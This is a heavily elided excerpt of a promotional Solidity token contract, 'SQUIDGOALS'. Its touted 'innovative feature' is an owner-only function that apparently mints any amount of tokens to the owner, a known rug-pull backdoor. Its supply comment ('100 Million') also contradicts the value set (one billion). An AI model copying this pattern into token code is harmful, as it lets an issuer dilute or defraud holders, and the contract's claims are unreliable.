...
//
// $squidgoals proposes an innovative feature in its contract.
//
// 📱 Telegram: https://t.me/SquidGoals
// 🌎 Website: 
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function squidgoals(uint256 amount) public onlyOwner {
    _squidgoals(msg.sender, amount);
    }
    ...
    function _squidgoals(address account, uint256 amount) internal virtual {
...
contract SQUIDGOALS is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("SQUIDGOALS", "SQUIDGOALS") {
        _squidgoals(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}